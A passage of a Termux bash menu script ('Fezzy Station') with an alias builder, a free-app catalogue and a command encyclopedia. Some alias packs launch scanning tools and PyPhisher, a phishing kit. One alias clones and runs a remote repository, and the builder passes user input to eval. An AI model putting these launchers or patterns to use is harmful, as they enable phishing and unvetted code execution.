                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            I)  echo ""
                printf "  ${C25}[*] Installing ranger + ncdu...${RESET}\n\n"
                pkg install ranger ncdu -y 2>/dev/null
                echo ""
                command -v ranger &>/dev/null && printf "  ${GRN}✓ ranger installed${RESET}\n" || printf "  ${YEL}ranger: check pkg install ranger${RESET}\n"
                command -v ncdu &>/dev/null && printf "  ${GRN}✓ ncdu installed${RESET}\n" || printf "  ${YEL}ncdu: check pkg install ncdu${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            B) return 0 ;;
            M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [26] SHORTCUT BUILDER PORTAL — ALIASES · BASHRC · PACKS
# ═══════════════════════════════════════════════════════════════════

shortcut_builder_portal() {
    clear
    echo ""
    _dv26
    printf "  ${C26}${BOLD}▶  SHORTCUT BUILDER PORTAL  ·  ALIASES · BASHRC · PACKS  ·  999${RESET}\n"
    _dv26
    echo ""
    _spin "Loading ~/.bashrc alias index" 0.4 "${C26}"
    _spin "Reading shortcut store" 0.3 "${FADE}"
    echo ""
    _dv26
    echo ""
    _countdown "SHORTCUT BUILDER LOCKED IN"
    printf "  ${FADE}Build it once. Type it forever. SOI. 999.${RESET}\n"
    echo ""
    _dv26
    echo ""

    # ── helpers ───────────────────────────────────────────────────
    _sb_list_aliases() {
        grep "^alias " ~/.bashrc 2>/dev/null | sed "s/alias /  ${C26}●${RESET}  /;s/=/ ${FADE}→${RESET} /" || \
            printf "  ${FADE}No aliases in ~/.bashrc yet${RESET}\n"
    }
    _sb_reload() {
        source ~/.bashrc 2>/dev/null
        printf "  ${GRN}✓ ~/.bashrc reloaded — aliases live now${RESET}\n"
    }

    while true; do
        clear
        echo ""
        _dv26
        printf "  ${C26}${BOLD}SHORTCUT BUILDER PORTAL  ·  ALIASES · PACKS · EXPORT  ·  999${RESET}\n"
        _dv26
        echo ""
        local alias_count; alias_count=$(grep -c "^alias " ~/.bashrc 2>/dev/null || echo 0)
        printf "  ${WH}Current aliases in ~/.bashrc: ${C26}%s${RESET}\n\n" "$alias_count"
        _sb_list_aliases | head -15
        [[ "$alias_count" -gt 15 ]] && printf "  ${FADE}  ... and %d more (use [V] to see all)${RESET}\n" "$(( alias_count - 15 ))"
        echo ""
        _dv26
        echo ""
        printf "  ${FADE}── BUILD ──────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C26}${BOLD}[1]${RESET}  ${WH}Add alias${RESET}               ${FADE}— type name + command, live in session${RESET}\n"
        printf "  ${C26}${BOLD}[2]${RESET}  ${WH}Remove alias${RESET}             ${FADE}— delete from ~/.bashrc${RESET}\n"
        printf "  ${C26}${BOLD}[3]${RESET}  ${WH}Edit alias${RESET}               ${FADE}— change command for existing alias${RESET}\n"
        echo ""
        printf "  ${FADE}── PACKS (bulk install) ───────────────────────────────────────${RESET}\n"
        printf "  ${C26}${BOLD}[4]${RESET}  ${WH}Pack: All 30 portals${RESET}     ${FADE}— adds portal1–portal30 aliases${RESET}\n"
        printf "  ${C26}${BOLD}[5]${RESET}  ${WH}Pack: Desktop / VNC${RESET}      ${FADE}— desktop, killdesk, vnc, killalix${RESET}\n"
        printf "  ${C26}${BOLD}[6]${RESET}  ${WH}Pack: Hacker tools${RESET}       ${FADE}— nmap, dig, nikto, gdorker shortcuts${RESET}\n"
        printf "  ${C26}${BOLD}[7]${RESET}  ${WH}Pack: Media shortcuts${RESET}    ${FADE}— ytdl, mp3dl, galdl, tordl${RESET}\n"
        printf "  ${C26}${BOLD}[8]${RESET}  ${WH}Pack: Station launch${RESET}     ${FADE}— fz (launch Fezzy Station), fzr (reload)${RESET}\n"
        echo ""
        printf "  ${FADE}── UTIL ALIASES (learn + apply) ───────────────────────────────${RESET}\n"
        printf "  ${C26}${BOLD}[10]${RESET} ${WH}Pack: Util Aliases${RESET}       ${FADE}— detox · clean · crystal${RESET}\n"
        printf "  ${FADE}       detox  →  rm -rf \$TMPDIR/* ; apt autoremove ; pkg clean ; pkg autoclean ; termux-setup-storage${RESET}\n"
        printf "  ${FADE}       clean  →  cd ~/termux-junk-cleaner && ./termux-junk-cleaner.sh${RESET}\n"
        printf "  ${FADE}       crystal→  python3 ~/pyphisher.py${RESET}\n"
        echo ""
        printf "  ${FADE}── DEPLOY ─────────────────────────────────────────────────────${RESET}\n"
        printf "  ${C26}${BOLD}[9]${RESET}  ${WH}Apply to session (source ~/.bashrc)${RESET}\n"
        printf "  ${C26}${BOLD}[E]${RESET}  ${WH}Export ~/.bashrc to /sdcard/Download/${RESET}\n"
        printf "  ${C26}${BOLD}[V]${RESET}  ${WH}View all aliases in ~/.bashrc${RESET}\n"
        printf "  ${C26}${BOLD}[C]${RESET}  ${WH}Clear ALL Fezzy aliases (keep system aliases)${RESET}\n"
        echo ""
        _dv26
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv26
        echo ""
        printf "  ${C26}${BOLD}Choice » ${RESET}"
        read -r sb_ch

        case "${sb_ch^^}" in
            1)
                echo ""
                printf "  ${WH}Alias name (no spaces, e.g. mydig): ${RESET}"; read -r sb_name
                [[ -z "$sb_name" ]] && continue
                printf "  ${WH}Command: ${RESET}"; read -r sb_cmd
                [[ -z "$sb_cmd" ]] && continue
                # Remove existing same alias
                sed -i "/^alias ${sb_name}=/d" ~/.bashrc 2>/dev/null
                echo "alias ${sb_name}='${sb_cmd}'" >> ~/.bashrc
                eval "alias ${sb_name}='${sb_cmd}'" 2>/dev/null
                printf "  ${GRN}✓ Added: alias %s='%s'${RESET}\n" "$sb_name" "$sb_cmd"
                printf "  ${FADE}Live in current session — persists after source ~/.bashrc${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""
                printf "  ${WH}Alias name to remove: ${RESET}"; read -r sb_del
                [[ -z "$sb_del" ]] && continue
                if grep -q "^alias ${sb_del}=" ~/.bashrc 2>/dev/null; then
                    sed -i "/^alias ${sb_del}=/d" ~/.bashrc 2>/dev/null
                    unalias "$sb_del" 2>/dev/null
                    printf "  ${GRN}✓ Removed: %s${RESET}\n" "$sb_del"
                else
                    printf "  ${YEL}Alias '%s' not found in ~/.bashrc${RESET}\n" "$sb_del"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${WH}Alias name to edit: ${RESET}"; read -r sb_edit
                [[ -z "$sb_edit" ]] && continue
                local old_cmd; old_cmd=$(grep "^alias ${sb_edit}=" ~/.bashrc 2>/dev/null | head -1 | sed "s/alias ${sb_edit}=//;s/^'//;s/'$//")
                if [[ -z "$old_cmd" ]]; then
                    printf "  ${YEL}Alias '%s' not found${RESET}\n" "$sb_edit"; sleep 1; continue
                fi
                printf "  ${FADE}Current: %s${RESET}\n" "$old_cmd"
                printf "  ${WH}New command: ${RESET}"; read -r sb_new_cmd
                [[ -z "$sb_new_cmd" ]] && continue
                sed -i "/^alias ${sb_edit}=/d" ~/.bashrc 2>/dev/null
                echo "alias ${sb_edit}='${sb_new_cmd}'" >> ~/.bashrc
                eval "alias ${sb_edit}='${sb_new_cmd}'" 2>/dev/null
                printf "  ${GRN}✓ Updated: %s → %s${RESET}\n" "$sb_edit" "$sb_new_cmd"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                printf "  ${C26}[*] Installing 26-portal alias pack...${RESET}\n\n"
                local SELF_PATH; SELF_PATH="$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "$HOME/fezzy_station_v1_extended_.sh")"
                local portal_names=("gallery" "music" "video" "webgrab" "search" "tools" "juicewrld" "social" "fileorg" "books" "hacker" "pdf" "docs" "android" "downloads" "clipboard" "notifs" "research" "github" "news" "fezzyhacker" "encryption" "torrent" "desktop" "filemanager" "shortcuts" "foss" "termuxenc" "fezzyartist" "musicplayer")
                for i in "${!portal_names[@]}"; do
                    local pn="${portal_names[$i]}"
                    local num=$(( i + 1 ))
                    sed -i "/^alias portal${num}=/d" ~/.bashrc 2>/dev/null
                    echo "alias portal${num}='source ${SELF_PATH} && ${pn}_portal 2>/dev/null || echo portal ${num}'" >> ~/.bashrc
                    printf "  ${C26}✓${RESET}  portal%d → %s\n" "$num" "$pn"
                done
                _sb_reload
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                printf "  ${C26}[*] Installing Desktop/VNC pack...${RESET}\n\n"
                local SELF_PATH; SELF_PATH="$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "$HOME/fezzy_station_v1_extended_.sh")"
                local pack5=(
                    "desktop|bash ~/launch_xfce.sh"
                    "killdesk|pkill -f xfce4; pkill -f termux-x11; pkill Xvnc; pkill dbus-daemon"
                    "vnc|vncserver :1 -geometry 1280x720 -depth 24"
                    "killvnc|vncserver -kill :1; pkill Xvnc; pkill x11vnc"
                    "x11start|export DISPLAY=:0; export XDG_RUNTIME_DIR=\$TMPDIR; termux-x11 :0 &"
                    "xfstart|dbus-launch --exit-with-session xfce4-session &"
                    "reloadsettings|termux-reload-settings"
                )
                for entry in "${pack5[@]}"; do
                    local al="${entry%%|*}" cmd="${entry#*|}"
                    sed -i "/^alias ${al}=/d" ~/.bashrc 2>/dev/null
                    echo "alias ${al}='${cmd}'" >> ~/.bashrc
                    printf "  ${C26}✓${RESET}  %s\n" "$al"
                done
                _sb_reload
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C26}[*] Installing Hacker tools pack...${RESET}\n\n"
                local pack6=(
                    "quicknmap|nmap -F"
                    "quickdig|dig +short"
                    "quicknikto|nikto -h"
                    "gdork|cd ~/Gdorker && python3 gdorker.py -d"
                    "torcheck|torsocks curl -s https://check.torproject.org/api/ip"
                    "proxycheck|proxychains4 -q curl -s https://check.torproject.org/api/ip"
                    "starttor|tor &"
                    "stoptor|pkill tor"
                )
                for entry in "${pack6[@]}"; do
                    local al="${entry%%|*}" cmd="${entry#*|}"
                    sed -i "/^alias ${al}=/d" ~/.bashrc 2>/dev/null
                    echo "alias ${al}='${cmd}'" >> ~/.bashrc
                    printf "  ${C26}✓${RESET}  %s\n" "$al"
                done
                _sb_reload
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                printf "  ${C26}[*] Installing Media shortcuts pack...${RESET}\n\n"
                local pack7=(
                    "ytdl|yt-dlp"
                    "mp3dl|yt-dlp -x --audio-format mp3"
                    "galdl|gallery-dl"
                    "ytbest|yt-dlp -f bestvideo+bestaudio"
                    "yt720|yt-dlp -f 'bestvideo[height<=720]+bestaudio'"
                    "ytplaylist|yt-dlp --yes-playlist"
                )
                for entry in "${pack7[@]}"; do
                    local al="${entry%%|*}" cmd="${entry#*|}"
                    sed -i "/^alias ${al}=/d" ~/.bashrc 2>/dev/null
                    echo "alias ${al}='${cmd}'" >> ~/.bashrc
                    printf "  ${C26}✓${RESET}  %s\n" "$al"
                done
                _sb_reload
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                printf "  ${C26}[*] Installing Station launch pack...${RESET}\n\n"
                local SELF_PATH; SELF_PATH="$(realpath "${BASH_SOURCE[0]}" 2>/dev/null || echo "$HOME/fezzy_station_v1_extended_.sh")"
                sed -i '/^alias fz=/d;/^alias fzr=/d;/^alias fzh=/d' ~/.bashrc 2>/dev/null
                echo "alias fz='bash ${SELF_PATH}'" >> ~/.bashrc
                echo "alias fzr='source ${SELF_PATH}'" >> ~/.bashrc
                echo "alias fzh='bash ${SELF_PATH} && fezzyhacker_portal'" >> ~/.bashrc
                printf "  ${C26}✓${RESET}  fz   → launch Fezzy Station\n"
                printf "  ${C26}✓${RESET}  fzr  → source Fezzy Station\n"
                printf "  ${C26}✓${RESET}  fzh  → jump straight to Exploitation\n"
                _sb_reload
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)  _sb_reload
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                printf "  ${C26}[*] Installing Util Alias pack (detox · clean · crystal)...${RESET}\n\n"
                sed -i '/^alias detox=/d;/^alias clean=/d;/^alias crystal=/d' ~/.bashrc 2>/dev/null
                # detox — nuke tmp, pkg cleanup, reset storage
                echo "alias detox='rm -rf \${TMPDIR:-/data/data/com.termux/files/usr/tmp}/* 2>/dev/null; apt autoremove -y; pkg clean; pkg autoclean; termux-setup-storage; echo Done'" >> ~/.bashrc
                # clean — run termux-junk-cleaner (clone first if needed)
                echo "alias clean='[[ -d ~/termux-junk-cleaner ]] || git clone https://github.com/ArjunCodesmith/termux-junk-cleaner.git ~/termux-junk-cleaner; cd ~/termux-junk-cleaner && chmod +x termux-junk-cleaner.sh && ./termux-junk-cleaner.sh'" >> ~/.bashrc
                # crystal — launch PyPhisher
                echo "alias crystal='[[ -f ~/pyphisher.py ]] && python3 ~/pyphisher.py || echo "  PyPhisher not found — open Exploitation Portal [21] → [15] to download"'" >> ~/.bashrc
                printf "  ${C26}✓${RESET}  detox  → nuke tmp + pkg cleanup + termux-setup-storage\n"
                printf "  ${C26}✓${RESET}  clean  → run termux-junk-cleaner (auto-clones if missing)\n"
                printf "  ${C26}✓${RESET}  crystal→ python3 ~/pyphisher.py\n"
                _sb_reload
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            E)
                echo ""
                cp ~/.bashrc "/sdcard/Download/bashrc_fezzy_$(date +%Y%m%d_%H%M).txt" 2>/dev/null \
                    && printf "  ${GRN}✓ Exported to /sdcard/Download/${RESET}\n" \
                    || printf "  ${RED}Export failed — check storage permissions${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            V)
                echo ""
                _dv26
                printf "  ${C26}ALL ALIASES IN ~/.bashrc:${RESET}\n\n"
                grep "^alias " ~/.bashrc 2>/dev/null | while IFS= read -r line; do
                    local al cmd
                    al=$(echo "$line" | sed "s/alias //;s/=.*//")
                    cmd=$(echo "$line" | sed "s/alias ${al}=//;s/^'//;s/'$//")
                    printf "  ${C26}%-20s${RESET}  ${FADE}→${RESET}  ${WH}%s${RESET}\n" "$al" "$cmd"
                done
                _dv26
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            C)
                echo ""
                printf "  ${YEL}Remove ALL Fezzy aliases from ~/.bashrc? [y/n]: ${RESET}"; read -r sb_nuke
                if [[ "$sb_nuke" == "y" || "$sb_nuke" == "Y" ]]; then
                    sed -i '/^alias portal[0-9]/d;/^alias fz/d;/^alias desktop/d;/^alias killdesk/d;/^alias vnc/d;/^alias killvnc/d;/^alias ytdl/d;/^alias mp3dl/d;/^alias galdl/d;/^alias quicknmap/d;/^alias quickdig/d;/^alias gdork/d' ~/.bashrc 2>/dev/null
                    printf "  ${GRN}✓ Fezzy aliases cleared${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            B) return 0 ;;
            M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}


# ═══════════════════════════════════════════════════════════════════
#  [27] FOSS APP DISCOVERY PORTAL
# ═══════════════════════════════════════════════════════════════════

foss_portal() {
    local STORE="fdroid"
    local STORE_LABEL="F-Droid"
    local STORE_URL="https://f-droid.org/packages/"

    # Curated FOSS app list: name|desc|fdroid-id|github-url
    local APPS=(
        "NewPipe|Lightweight YouTube frontend · No ads · Background play|org.schabi.newpipe|https://github.com/TeamNewPipe/NewPipe"
        "Organic Maps|Privacy-first maps · Offline · OpenStreetMap|app.organicmaps|https://github.com/organicmaps/organicmaps"
        "Bitwarden|Password manager · Encrypted · Cross-platform|com.x8bit.bitwarden|https://github.com/bitwarden/mobile"
        "KeePassDX|Offline password vault · AES encryption|com.kunzisoft.keepass.libre|https://github.com/Kunzisoft/KeePassDX"
        "Syncthing|Peer-to-peer file sync · No cloud|com.nutomic.syncthingandroid|https://github.com/syncthing/syncthing-android"
        "K-9 Mail|Open source email client · PGP support|com.fsck.k9|https://github.com/thunderbird/thunderbird-android"
        "Tusky|Mastodon client · Fediverse|com.keylesspalace.tusky|https://github.com/tuskyapp/Tusky"
        "AntennaPod|Podcast manager · RSS · Download queue|de.danoeh.antennapod|https://github.com/AntennaPod/AntennaPod"
        "Feeder|RSS reader · Offline reading|com.nononsenseapps.feeder|https://github.com/spacecowboy/Feeder"
        "OsmAnd~|Navigation · Offline maps · Voice guidance|net.osmand.plus|https://github.com/osmandapp/OsmAnd"
        "Obtainium|Install apps direct from source|dev.imranr.obtainium|https://github.com/ImranR98/Obtainium"
        "Droid-ify|Material You F-Droid client|com.looker.droidify|https://github.com/Droid-ify/client"
        "Aurora Store|Anonymous Play Store access|com.aurora.store|https://gitlab.com/AuroraOSS/AuroraStore"
        "Termux|Terminal emulator · Linux environment|com.termux|https://github.com/termux/termux-app"
        "mpv for Android|Media player · All formats|is.xyz.mpv|https://github.com/mpv-android/mpv-android"
        "VLC|Universal media player|org.videolan.vlc|https://github.com/videolan/vlc-android"
        "LibreOffice Viewer|View office documents|org.documentfoundation.libreoffice|https://github.com/LibreOffice/core"
        "Nextcloud|Self-hosted cloud sync|com.nextcloud.client|https://github.com/nextcloud/android"
        "andOTP|2-Factor authenticator|org.shadowice.flocke.andotp|https://github.com/andOTP/andOTP"
        "Aegis Authenticator|Secure 2FA vault|com.beemdevelopment.aegis|https://github.com/beemdevelopment/Aegis"
    )

    while true; do
        clear
        echo ""
        _dv27
        printf "  ${C27}${BOLD}▶  FOSS APP DISCOVERY  ·  OPEN SOURCE · NO TRACKING · 999${RESET}\n"
        _dv27
        echo ""
        _hover_hint "foss"
        echo ""

        printf "  ${C27}── SELECT YOUR STORE ──────────────────────────────────────────────${RESET}\n"
        echo ""
        printf "  ${WH}[1]${RESET} ${C27}F-Droid${RESET}          ${FADE}— largest FOSS repository (3,800+ apps)${RESET}\n"
        printf "  ${WH}[2]${RESET} ${C27}Obtainium${RESET}        ${FADE}— install direct from GitHub / GitLab source${RESET}\n"
        printf "  ${WH}[3]${RESET} ${C27}Aurora Store${RESET}     ${FADE}— anonymous Play Store access · no account${RESET}\n"
        printf "  ${WH}[4]${RESET} ${C27}Droid-ify${RESET}        ${FADE}— Material You F-Droid client${RESET}\n"
        printf "  ${WH}[5]${RESET} ${C27}IzzyOnDroid${RESET}      ${FADE}— additional F-Droid repo · cutting edge${RESET}\n"
        echo ""
        _dv27
        echo ""
        printf "  ${C27}── CURATED FOSS APP LIST  ·  Active store: ${WH}${STORE_LABEL}${RESET}\n"
        echo ""

        local i=1
        for entry in "${APPS[@]}"; do
            local name desc
            name="${entry%%|*}"
            rest="${entry#*|}"
            desc="${rest%%|*}"
            printf "  ${C27}%2d.${RESET}  ${WH}%-18s${RESET}  ${FADE}%s${RESET}\n" "$i" "$name" "$desc"
            ((i++))
        done
        echo ""
        _dv27
        echo ""
        printf "  ${FADE}[1-5] Switch store  ·  [A] Browse all  ·  [#] Select app  ·  [B] Back${RESET}\n"
        echo ""
        printf "  ${C27}${BOLD}Choice » ${RESET}"
        read -r fc

        case "$fc" in
            1) STORE="fdroid";   STORE_LABEL="F-Droid";        STORE_URL="https://f-droid.org/packages/" ;;
            2) STORE="obtainium"; STORE_LABEL="Obtainium";     STORE_URL="https://github.com/" ;;
            3) STORE="aurora";   STORE_LABEL="Aurora Store";   STORE_URL="https://play.google.com/store/apps/details?id=" ;;
            4) STORE="droidify"; STORE_LABEL="Droid-ify";      STORE_URL="https://f-droid.org/packages/" ;;
            5) STORE="izzy";     STORE_LABEL="IzzyOnDroid";    STORE_URL="https://apt.izzysoft.de/fdroid/index/apk/" ;;
            B|b) _finish_msg foss; return ;;
            A|a)
                echo ""
                printf "  ${C27}Opening F-Droid web catalogue...${RESET}\n"
                termux-open-url "https://f-droid.org/packages/" 2>/dev/null \
                    || printf "  ${FADE}termux-open-url not available — visit: https://f-droid.org${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            ''|*[!0-9]*)
                printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
            *)
                local idx=$(( fc - 1 ))
                if [[ $idx -lt 0 || $idx -ge ${#APPS[@]} ]]; then
                    printf "  ${RED}Invalid number${RESET}\n"; sleep 0.7; continue
                fi
                local sel="${APPS[$idx]}"
                local sname sdesc spkg sgit
                sname="${sel%%|*}"; rest="${sel#*|}"; sdesc="${rest%%|*}"; rest="${rest#*|}"; spkg="${rest%%|*}"; sgit="${rest#*|}"

                clear
                echo ""
                _dv27
                printf "  ${C27}${BOLD}▶  %s${RESET}\n" "$sname"
                _dv27
                echo ""
                printf "  ${WH}%s${RESET}\n" "$sdesc"
                echo ""
                printf "  ${C27}Package:${RESET}  ${WH}%s${RESET}\n" "$spkg"
                printf "  ${C27}GitHub: ${RESET}  ${FADE}%s${RESET}\n" "$sgit"
                echo ""
                _dv27
                echo ""
                printf "  ${WH}[D]${RESET} ${C27}Open in ${STORE_LABEL}${RESET}   ${WH}[G]${RESET} ${C27}Open GitHub page${RESET}   ${WH}[B]${RESET} ${FADE}Back${RESET}\n"
                echo ""
                printf "  ${C27}${BOLD}Action » ${RESET}"
                read -r act
                case "${act,,}" in
                    d)
                        local launch_url="${STORE_URL}${spkg}"
                        [[ "$STORE" == "obtainium" || "$STORE" == "github" ]] && launch_url="$sgit"
                        printf "  ${C27}Opening %s...${RESET}\n" "$STORE_LABEL"
                        termux-open-url "$launch_url" 2>/dev/null \
                            || printf "  ${FADE}Visit: %s${RESET}\n" "$launch_url"
                        echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                    g)
                        printf "  ${C27}Opening GitHub...${RESET}\n"
                        termux-open-url "$sgit" 2>/dev/null \
                            || printf "  ${FADE}Visit: %s${RESET}\n" "$sgit"
                        echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
                    b) ;;
                    *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
                esac ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [28] TERMUX ENCYCLOPEDIA PORTAL
# ═══════════════════════════════════════════════════════════════════

termux_encyclopedia_portal() {
    # Knowledge base: category|topic|command/tip|explanation
    declare -A ENC
    ENC["aliases:1"]="Create alias|alias ll='ls -la'|Creates alias for current session only"
    ENC["aliases:2"]="Permanent alias|echo \"alias ll='ls -la'\" >> ~/.bashrc|Append to .bashrc to survive reboots"
    ENC["aliases:3"]="Remove alias|unalias ll|Removes alias from current session"
    ENC["aliases:4"]="List all aliases|alias|Shows every alias currently loaded"
    ENC["aliases:5"]="Reload bashrc|source ~/.bashrc|Applies .bashrc changes without restart"
    ENC["nano:1"]="Save file|Ctrl+O then ENTER|Write buffer to file"
    ENC["nano:2"]="Exit nano|Ctrl+X|Exit · prompts to save if unsaved changes"
    ENC["nano:3"]="Search in file|Ctrl+W|Opens search prompt — Enter to find next"
    ENC["nano:4"]="Search and replace|Ctrl+\\\\|Find and replace across whole file"
    ENC["nano:5"]="Go to line|Ctrl+_ then line number|Jump to exact line number"
    ENC["nano:6"]="Enable line numbers|nano -l filename|Shows line numbers in sidebar"
    ENC["pkg:1"]="Search packages|pkg search keyword|Search available packages by name"
    ENC["pkg:2"]="Install package|pkg install package-name -y|Install and auto-confirm"
    ENC["pkg:3"]="Remove package|pkg remove package-name|Uninstall a package"
    ENC["pkg:4"]="Upgrade all|pkg upgrade -y|Update all installed packages"
    ENC["pkg:5"]="List installed|pkg list-installed|Show all installed packages"
    ENC["files:1"]="Copy file|cp source dest|Copy file to destination"
    ENC["files:2"]="Move/Rename|mv source dest|Move or rename file"
    ENC["files:3"]="Delete file|rm filename|Delete file permanently"
    ENC["files:4"]="Find by name|find /path -name 'pattern'|Search files by name pattern"
    ENC["files:5"]="Search in files|grep -r 'text' /path|Recursive text search in files"
    ENC["files:6"]="Change permissions|chmod 755 file|Set rwxr-xr-x permissions"
    ENC["perms:1"]="Storage access|termux-setup-storage|Grants ~/storage/* access to sdcard"
    ENC["perms:2"]="Make executable|chmod +x script.sh|Allow script to run with bash"
    ENC["perms:3"]="Check permissions|ls -la|Shows permissions for each file"
    ENC["api:1"]="Battery status|termux-battery-status|Returns JSON with level + charging state"
    ENC["api:2"]="Send SMS|termux-sms-send -n NUMBER 'msg'|Sends SMS via Android"
    ENC["api:3"]="Torch on|termux-torch on|Enable flashlight"
    ENC["api:4"]="Clipboard get|termux-clipboard-get|Read current clipboard content"
    ENC["api:5"]="Notification|termux-notification --title T --content C|Push notification"
    ENC["api:6"]="Open URL|termux-open-url https://...|Launch URL in browser"
    ENC["cron:1"]="Install crond|pkg install cronie|Install cron daemon"
    ENC["cron:2"]="Edit crontab|crontab -e|Open cron schedule editor"
    ENC["cron:3"]="List cron jobs|crontab -l|Show current scheduled jobs"
    ENC["cron:4"]="Wake lock|termux-wake-lock|Prevent device sleeping during jobs"
    ENC["git:1"]="Clone repo|git clone https://github.com/user/repo|Download repo locally"
    ENC["git:2"]="Push changes|git add . && git commit -m 'msg' && git push|Full push sequence"
    ENC["git:3"]="Set token|git remote set-url origin https://TOKEN@github.com/user/repo|Embed PAT"
    ENC["git:4"]="Check status|git status|Show staged/unstaged changes"
    ENC["git:5"]="Pull latest|git pull origin main|Fetch + merge from remote"
    ENC["python:1"]="Install pip package|pip install package --break-system-packages|Install without venv"
    ENC["python:2"]="Create venv|python3 -m venv myenv|Isolated Python environment"
    ENC["python:3"]="Activate venv|source myenv/bin/activate|Enter virtual environment"
    ENC["python:4"]="Run script|python3 script.py|Execute Python file"
    ENC["backup:1"]="Tar compress|tar -czf backup.tar.gz /path|Create compressed archive"
    ENC["backup:2"]="Extract tar|tar -xzf backup.tar.gz|Extract compressed archive"
    ENC["backup:3"]="GPG encrypt|gpg -c file|Symmetric passphrase encryption"
    ENC["network:1"]="Ping host|ping -c 4 google.com|Send 4 ICMP packets"
    ENC["network:2"]="Check IP|curl ifconfig.me|Get public IP address"
    ENC["network:3"]="Port scan|nmap -F target|Fast port scan"
    ENC["network:4"]="Download file|wget https://url/file|Download file from URL"
    ENC["troubleshoot:1"]="Fix dpkg broken|dpkg --configure -a|Repair broken package state"
    ENC["troubleshoot:2"]="Clear pkg cache|pkg clean|Remove downloaded pkg cache files"
    ENC["troubleshoot:3"]="Fix storage perms|termux-setup-storage|Re-grant storage permissions"
    ENC["troubleshoot:4"]="Check disk usage|df -h|Show storage space per partition"
    ENC["troubleshoot:5"]="Kill process|pkill processname|Kill by name · use 'kill PID' for pid"
    ENC["vim:1"]="Open file|vim filename|Open or create file in vim"
    ENC["vim:2"]="Enter insert mode|i|Press i to start typing"
    ENC["vim:3"]="Exit insert mode|Esc|Return to normal/command mode"
    ENC["vim:4"]="Save file|:w then ENTER|Write buffer to disk"
    ENC["vim:5"]="Save and quit|:wq then ENTER|Save and exit vim"
    ENC["vim:6"]="Quit without saving|:q! then ENTER|Force quit discarding changes"
    ENC["vim:7"]="Search in file|/searchterm then ENTER|Press n to jump to next match"
    ENC["vim:8"]="Go to line|:42 then ENTER|Jump to line 42"
    ENC["vim:9"]="Delete line|dd|Delete current line in normal mode"
    ENC["vim:10"]="Undo|u|Undo last change in normal mode"
    ENC["vim:11"]="Copy line|yy then p|Yank line · paste below with p"
    ENC["vim:12"]="Enable line numbers|:set number|Show line numbers in sidebar"
    ENC["tmux:1"]="New session|tmux new -s name|Create named session"
    ENC["tmux:2"]="Attach session|tmux attach -t name|Re-attach to running session"
    ENC["tmux:3"]="List sessions|tmux ls|Show all running sessions"
    ENC["tmux:4"]="Kill session|tmux kill-session -t name|Destroy a session"
    ENC["tmux:5"]="New window|Ctrl+b then c|Create new window in session"
    ENC["tmux:6"]="Split horizontal|Ctrl+b then \"|Split pane top/bottom"
    ENC["tmux:7"]="Split vertical|Ctrl+b then %|Split pane left/right"
    ENC["tmux:8"]="Switch pane|Ctrl+b then arrow key|Move between panes"
    ENC["tmux:9"]="Detach session|Ctrl+b then d|Leave session running in background"
    ENC["tmux:10"]="Scroll mode|Ctrl+b then [|Enter scroll mode · q to exit"
    ENC["bash:1"]="For loop|for i in {1..5}; do echo \$i; done|Loop 1 to 5"
    ENC["bash:2"]="If statement|if [[ \$x -eq 1 ]]; then echo yes; fi|Condition check"
    ENC["bash:3"]="Read user input|read -r varname|Reads line from stdin into variable"
    ENC["bash:4"]="Array|arr=(a b c); echo \${arr[0]}|Define array · access by index"
    ENC["bash:5"]="String length|\${#myvar}|Returns character count of variable"
    ENC["bash:6"]="Check file exists|[[ -f file ]] && echo yes|Test file presence"
    ENC["bash:7"]="Function|myfunc() { echo hello; }; myfunc|Define and call function"
    ENC["bash:8"]="Redirect output|cmd > out.txt|Write stdout to file"
    ENC["bash:9"]="Append output|cmd >> out.txt|Append stdout to file"
    ENC["bash:10"]="Background process|cmd &|Run command in background"
    ENC["bash:11"]="Command substitution|var=\$(cmd)|Store command output in variable"
    ENC["bash:12"]="Case statement|case \$x in a) echo A;; b) echo B;; esac|Pattern match"
    ENC["ssh:1"]="Connect to server|ssh user@host|Connect via SSH"
    ENC["ssh:2"]="Connect on custom port|ssh -p 2222 user@host|SSH to non-default port"
    ENC["ssh:3"]="Copy file to server|scp file user@host:/path|Secure copy upload"
    ENC["ssh:4"]="Copy file from server|scp user@host:/remote/file ./|Secure copy download"
    ENC["ssh:5"]="Generate SSH key|ssh-keygen -t ed25519|Create new key pair"
